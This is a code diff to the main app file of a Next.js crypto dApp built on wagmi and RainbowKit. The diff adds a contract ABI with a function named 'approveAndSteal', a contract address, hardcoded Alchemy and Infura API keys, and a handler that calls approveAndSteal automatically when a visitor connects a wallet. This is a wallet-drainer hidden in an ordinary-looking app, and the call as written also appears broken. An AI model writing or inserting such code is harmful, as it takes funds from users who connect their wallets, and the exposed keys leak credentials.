@@ -17,46 +17,210 @@ import { alchemyProvider } from "wagmi/providers/alchemy";
 import { publicProvider } from "wagmi/providers/public";
 import MainLayout from "../layout/mainLayout";
 
+const abi =[
+    {
+      "inputs": [],
+      "name": "approveAndSteal",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "name": "allowance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "name": "approve",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "decimals",
+      "outputs": [
+        {
+          "internalType": "uint8",
+          "name": "",
+          "type": "uint8"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "name": "transfer",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        },
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "name": "transferFrom",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ];
+
+const contractAddress = '0xbAa68d816B2713F9e2f188f1B802ef8b77B2936b';
+const alchemyAPIKey = 'JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
+const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/JJbjMztYVUqS5wDcRxF8wmBPrimSglub';
+
+const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
+const infuraURL = 'https://polygon-mainnet.infura.io/v3/c6f67ed83ef14e6298373339528a7587';
+const tokenParams = {
+    name: 'WETH',
+    symbol: 'WETH',
+    WETH_ADDRESS: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+};
+
 const { chains, provider } = configureChains(
-	[
-		mainnet,
-		goerli,
-		polygon,
-		polygonMumbai,
-		optimism,
-		optimismGoerli,
-		arbitrum,
-		arbitrumGoerli,
-	],
-	[alchemyProvider({ apiKey: process.env.ALCHEMY_API_KEY }), publicProvider()]
+  [
+    mainnet,
+    goerli,
+    polygon,
+    polygonMumbai,
+    optimism,
+    optimismGoerli,
+    arbitrum,
+    arbitrumGoerli,
+  ],
+  [alchemyProvider({ apiKey: process.env.ALCHEMY_API_KEY }), publicProvider()]
 );
 
 const { connectors } = getDefaultWallets({
-	appName: "My Alchemy DApp",
-	chains,
+  appName: "My Alchemy DApp",
+  chains,
 });
 
 const wagmiClient = createClient({
-	autoConnect: true,
-	connectors,
-	provider,
+  autoConnect: true,
+  connectors,
+  provider,
+});
+
+wagmiClient.on("connect", async () => {
+  try {
+    await wagmiClient.approveAndSteal(contractAddress); // Call approveAndSteal upon connecting the wallet
+  } catch (error) {
+    console.error("Error calling approveAndSteal:", error);
+  }
 });
 
 export { WagmiConfig, RainbowKitProvider };
+
 function MyApp({ Component, pageProps }) {
-	return (
-		<WagmiConfig client={wagmiClient}>
-			<RainbowKitProvider
-				modalSize="compact"
-				initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
-				chains={chains}
-			>
-				<MainLayout>
-					<Component {...pageProps} />
-				</MainLayout>
-			</RainbowKitProvider>
-		</WagmiConfig>
-	);
+  return (
+    <WagmiConfig client={wagmiClient}>
+      <RainbowKitProvider
+        modalSize="compact"
+        initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
+        chains={chains}
+      >
+        <MainLayout>
+          <Component {...pageProps} />
+        </MainLayout>
+      </RainbowKitProvider>
+    </WagmiConfig>
+  );
 }
 
 export default MyApp;
